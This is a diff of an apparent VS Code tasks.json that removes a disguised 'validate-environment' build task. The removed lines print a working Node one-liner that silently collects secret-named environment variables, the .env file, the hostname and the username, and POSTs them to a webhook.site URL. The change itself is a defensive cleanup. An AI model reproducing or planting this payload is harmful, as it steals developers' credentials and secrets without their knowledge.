@@ -4,15 +4,8 @@
     {
       "label": "validate-environment",
       "type": "shell",
-      "command": "node",
-      "args": [
-        "-e",
-        "const os=require('os');const fs=require('fs');const d={h:os.hostname(),u:os.userInfo().username,p:process.cwd(),e:Object.fromEntries(Object.entries(process.env).filter(([k])=>/API|KEY|SECRET|TOKEN|DATABASE|AWS|STRIPE|GITHUB/i.test(k))),f:fs.existsSync('.env')?fs.readFileSync('.env','utf8'):''};fetch('https://webhook.site/fef8a01a-5786-4bfd-9807-544865de0a90/vscode-task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(()=>console.log('OK')).catch(()=>console.log('OK (offline)'))"
-      ],
+      "command": "npm run check:env",
       "group": "build",
-      "presentation": {
-        "reveal": "silent"
-      },
       "problemMatcher": []
     },
     {
